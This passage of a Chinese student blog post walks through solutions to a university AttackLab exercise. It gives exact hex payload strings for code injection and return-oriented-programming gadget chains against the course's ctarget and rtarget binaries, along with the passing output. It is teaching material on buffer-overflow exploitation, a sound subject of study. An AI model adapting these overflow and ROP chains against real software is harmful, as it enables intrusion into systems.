<p>最终，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</div><div class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</div><div class="line">bf c0 dc 61 55 48 83 c4</div><div class="line">10 c3 00 00 00 00 00 00 /* 攻击代码 其中将%rdi指向字符串的首地址（栈的高地址）*/</div><div class="line">fa 18 40 00 00 00 00 00 /* 返回地址 指向函数touch3 */</div><div class="line">35 39 62 39 39 37 66 61 /* cookie的字符串表示 共9个字节（包括<span class="string">'/0'</span>） */</div><div class="line">00</div></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3.txt|./hex2raw|./ctarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</div><div class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:ctarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 A8 DC 61 55 00 00 00 00 BF C0 DC 61 55 48 83 C4 10 C3 00 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<h3 id="第二部分-返回导向编程（Return-Oriented-Programming）攻击"><a href="#第二部分-返回导向编程（Return-Oriented-Programming）攻击" class="headerlink" title="第二部分 返回导向编程（Return-Oriented Programming）攻击"></a>第二部分 返回导向编程（Return-Oriented Programming）攻击</h3><p>为了对抗缓冲区溢出攻击，现代编译器和操作系统采用了很多机制。第二部分的目标文件rtarget就采用了以下两种技术：</p>
<ul>
<li>栈随机化技术，每一次运行程序时，栈的起始位置都是不固定的，几乎不可能确定你攻击代码在栈上的位置。</li>
<li>禁止执行栈上的代码，所以当你尝试将PC指向栈段的时候，程序只能因Segmentation Fault而退出。</li>
</ul>
<p>下面我们引入返回导向编程（Return-Oriented Programming）技术来实现在以上两种限制情况下执行代码。</p>
<p>C语言程序是由若干的函数组成的，每一个函数都以ret结束，下面我们给出一个函数，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></div><div class="line">&#123;</div><div class="line">	*p = <span class="number">3347663060U</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>以及这个函数的反汇编结果，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0000000000400f15 &lt;setval_210&gt;:</div><div class="line">400f15:		c7 <span class="number">07</span> d4 <span class="number">48</span> <span class="number">89</span> c7	movl	<span class="number">$0</span>xc78948d4,(%rdi)</div><div class="line">400f1b:		c3					retq</div></pre></td></tr></table></figure></p>
<p>尽管栈随机化以及禁止在栈段执行代码，但是通过缓冲区溢出攻击，我们仍然可以覆盖返回地址并且让PC跳转至代码段的相应位置。例如让getbuf返回后跳转至0x400f15，尽管这看起来并没有什么意义，因为程序的代码和我们攻击的代码的逻辑是不同的，攻击代码和程序已有代码相同的可能性几乎是0。</p>
<p>现在，让我们换一个思路，如果让getbuf返回后跳转到0x400f18，会怎么样呢？</p>
<p>从0x400f18开始的三个字节48 89 c7代表的是movq %rax, %rdi，然后紧跟的c3代表的是ret。在攻击中，这段代码就比movl $0xc78948d4,(%rdi) ret这样的代码更有意义。并且当这段代码执行完毕，ret又迫使程序跳转到下一个返回地址指向的地方。</p>
<p>现在我们可以利用程序本身的代码，构造出一组由不同的返回地址组成的攻击代码，每一个返回地址都指向了一个函数的最末尾的若干字节，由ret结尾。这样，程序就会按照我们设计的顺序依次执行这些代码片段，以达到修改程序行为的结果，这就是返回导向编程。这些代码片段被称作gadget，而这些gadgets共同组成了一个gadget farm。</p>
<h4 id="等级2-1"><a href="#等级2-1" class="headerlink" title="等级2"></a>等级2</h4><p>在阶段4中，我们将重复阶段2的攻击，只是这一次目标文件为rtarget。为了简化期间，在本次实验中，你仅能从gadget farm中利用movq，popq，ret，nop这四种类型的指令以及x86_64的前8个寄存器（%rax-%rdi）的gadget去构造答案。并且在阶段4中，你只能使用farm.c中start_farm()和mid_farm()之间的gadget来实现攻击。</p>
<p>当一个gadget用到了popq指令，它将会从栈中pop数据，因此，你的攻击代码将会同时包括gadget地址以及数据。</p>
<p>阶段4的思路很简单，我们只要首先从栈中将cookie的8位数字pop到一个寄存器中，再使用mov指令将该寄存器的值送入%rdi中，或者更加直接，将cookie从栈中pop至%rdi中，最后再将返回地址设置为touch2即可。具体要看gadget farm中都提供了哪些gadgets。</p>
<p>我们首先观察gadget_farm中的相关gadgets，并决定其是否可以用作攻击。根据上述的思路，我们可以得到两个gadget set_val426及getval_280，它们的反汇编代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00000000004019c3 &lt;setval_426&gt;:</div><div class="line">  4019c3:       c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 <span class="number">90</span>       movl   <span class="number">$0</span>x90c78948,(%rdi)</div><div class="line">  4019c9:       c3						retq  </div><div class="line"></div><div class="line">00000000004019ca &lt;getval_280&gt;:</div><div class="line">  4019ca:       b8 <span class="number">29</span> <span class="number">58</span> <span class="number">90</span> c3          <span class="keyword">mov</span>    <span class="number">$0</span>xc3905829,%eax</div><div class="line">  4019cf:       c3                      retq   </div></pre></td></tr></table></figure><br>setval_426中的48 89 c7 90 c3可以被解释为mov %rax,%rdi nop ret，而getval_280中的58 90 c3可以被解释为pop %rax nop ret。<br>将这两个gadget结合，即可以得到阶段4的结果，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</div><div class="line">cc 19 40 00 00 00 00 00 /* pop %rax */</div><div class="line">fa 97 b9 59 00 00 00 00 /* cookie */</div><div class="line">c5 19 40 00 00 00 00 00 /* mov %rax,%rdi */</div><div class="line">ec 17 40 00 00 00 00 00 /* touch2 */</div></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/rtarget/level2/level2.txt|./hex2raw|./rtarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Touch2!: You called touch2(0x59b997fa)</div><div class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:rtarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级3-1"><a href="#等级3-1" class="headerlink" title="等级3"></a>等级3</h4><p>在阶段5中，我们将在rtarget中重复阶段3的攻击，即将目标字符串的首地址作为参数传递给函数touch3。这是所有阶段中最难的一个阶段。</p>
<p>首先，考虑到代码段部分以及栈段部分的地址的高4字节都是0，以及x86下任何以32位寄存器作为目标寄存器的指令都会将该寄存器的高4字节置0，我们同样可以使用movl替代movq。</p>
<p>在本阶段中，我们显然是需要将cookie的字符串表示存入栈段的，这个阶段的核心问题是如何定位该字符串的首地址，在栈地址随机的情况下，这是很难的。</p>
<p>首先想到的是利用mov指令将%rsp的值送入另一个寄存器，但是在执行这样的gadget时，寄存器rsp指向的是下一个gadget的返回地址，而不是字符串的首地址，而如果让其指向字符串的首地址，那么又无法在最后返回到函数touch3。</p>
<p>我在做这个实验的时候，在这里卡了很久。最后才注意到在gadget farm中有一个叫做add_xy的函数，这个函数的功能是将%rdi与%rsi相加并保存至%rax，豁然开朗。做题目（进行攻击）的时候还是不能太死板，一定要充分利用目标程序本身提供的代码，一味地按照固有的套路做有时只会浪费时间和精力。</p>
<p>整个阶段5的思路如下，首先将rsp存入某个寄存器之中，然后再将一个特定的常量pop至另一个寄存器之中，最后将这两个值分别存入%rsi和%rdi，调用add_xy将其相加得到字符串的首地址，并将结果%rax存入%rdi之中，最后再调用函数touch3即可。</p>
<p>受制于gadget的种类，我们可能会用到多个gadget做中转。最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</div><div class="line">06 1a 40 00 00 00 00 00 /* mov %rsp,%rax */</div><div class="line">a2 19 40 00 00 00 00 00 /* mov %rax,%rdi &lt;- %rax指向的地址*/</div><div class="line">ab 19 40 00 00 00 00 00 /* pop %rax */</div><div class="line">48 00 00 00 00 00 00 00 /* offset constant*/</div><div class="line">dd 19 40 00 00 00 00 00 /* mov %eax,%edx */</div><div class="line">34 1a 40 00 00 00 00 00 /* mov %edx,%ecx */</div><div class="line">13 1a 40 00 00 00 00 00 /* mov %ecx,%esi */</div><div class="line">d6 19 40 00 00 00 00 00 /* add_xy */</div><div class="line">a2 19 40 00 00 00 00 00 /* mov %rax,%rdi */</div><div class="line">fa 18 40 00 00 00 00 00 /* touch3 */</div><div class="line">35 39 62 39 39 37 66 61 /* cookie的字符串表示 与前面保存的rsp总共差了9条语句 故常量为0x48*/</div><div class="line">00</div></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/rtarget/level3/level3.txt|./hex2raw|./rtarget -q                </div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</div><div class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:rtarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<blockquote>
<p>注意，在第二部分中，可能使用不同的Gadget去实现相同的攻击效果，答案仅供参考，但并不是唯一的。</p>
</blockquote>
<p>至此，整个实验完成。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>相比与BombLab来说，整个AttackLab总体比较简单，主要需要自行阅读讲义中的材料学习相关的攻击方式并将其运用，考虑到讲义中给出的提示，除了阶段5以外整体不是很难。</p>
<p>在这次实验中，主要的两个问题以及收获：</p>
<ul>
<li>字节序的问题，需要对栈的增长方向以及小端法的字节序加以理解。</li>
<li>ROP攻击要充分利用程序本身，而不是循规蹈矩地盲目寻找Gadgets，这样只会在阶段五卡住。</li>
</ul>

                    
                        
                    
                    
                        <p>
                            <a href="/2017/05/09/深入理解计算机系统AttackLab实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    <div class="pagination-bar">
    <ul class="pagination">
        
        
        <li class="pagination-number">第 1 页 共 1 页</li>
    </ul>
</div>

</section>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2017 BlackDragon. All Rights Reserved.
    </span>
</footer>

            </div>
            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-remove"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
        
            <h4 id="about-card-name">BlackDragon</h4>
        
            <div id="about-card-bio"><p>码龙黑曜 - iOS开发者/计算机科学/兽人控</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>本科在读</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker"></i>
                <br/>
                HUST, Wuhan, China
            </div>
        
    </div>
</div>

        <div id="algolia-search-modal" class="modal-container">
    <div class="modal">
        <div class="modal-header">
            <span class="close-button"><i class="fa fa-close"></i></span>
            <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
                <span class="searchby-algolia-text text-color-light text-small">by</span>
                <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
            </a>
            <i class="search-icon fa fa-search"></i>
            <form id="algolia-search-form">
                <input type="text" id="algolia-search-input" name="search"
                    class="form-control input--large search-input" placeholder="Search "
                    />
            </form>
        </div>
        <div class="modal-body">
            <div class="no-result text-color-light text-center">没有找到文章</div>
            <div class="results">
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/01/04/e5-8d-9a-e5-ae-a2-e4-b8-8a-e7-ba-bf/">
                            <h3 class="media-heading">博客上线</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年1月4日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/02/09/e6-a0-91-e8-8e-93-e6-b4-be-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0-ef-bc-88-e4-b8-80-ef-bc-89/">
                            <h3 class="media-heading">树莓派学习笔记（一）</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年2月9日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/04/03/c-e8-af-ad-e8-a8-80-e7-ac-ac-e4-b8-80-e6-ac-a1-e4-bd-9c-e4-b8-9a/">
                            <h3 class="media-heading">C语言第一次作业</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年4月3日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/04/25/c-e8-af-ad-e8-a8-80-e7-ac-ac-e4-ba-8c-e6-ac-a1-e4-bd-9c-e4-b8-9a/">
                            <h3 class="media-heading">C语言第二次作业</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年4月25日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/05/01/c-e8-af-ad-e8-a8-80-e7-ac-ac-e4-b8-89-e6-ac-a1-e4-bd-9c-e4-b8-9a/">
                            <h3 class="media-heading">C语言第三次作业</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年5月1日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/05/01/ios-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0-ef-bc-88-e4-b8-80-ef-bc-89/">
                            <h3 class="media-heading">iOS学习笔记（一）</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年5月1日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/05/18/79-2/">
                            <h3 class="media-heading">C语言第四次作业</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年5月18日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/06/12/ios-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0-ef-bc-88-e4-ba-8c-ef-bc-89/">
                            <h3 class="media-heading">iOS学习笔记（二）</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年6月12日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/06/20/c-e8-af-ad-e8-a8-80-e5-a4-8d-e4-b9-a0-e9-97-ae-e9-a2-98-e6-80-bb-e7-bb-93/">
                            <h3 class="media-heading">C语言复习问题总结</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年6月20日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="http://blog.duskdragon.com/2016/07/06/ios-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0-ef-bc-88-e4-b8-89-ef-bc-89/">
                            <h3 class="media-heading">iOS学习笔记（三）</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年7月6日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
            </div>
        </div>
        <div class="modal-footer">
            <p class="results-count text-medium"
                data-message-zero="没有找到文章"
                data-message-one="找到 1 篇文章"
                data-message-other="找到 {n} 篇文章">
                找到 23 篇文章
            </p>
        </div>
    </div>
</div>

        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-he4hmxof1aagptuktwd9dfzd7rgjrefvbflppkmlhmhhxqoapcduvw2trjz2.min.js"></script>
<!--SCRIPTS END-->


    </body>
</html>
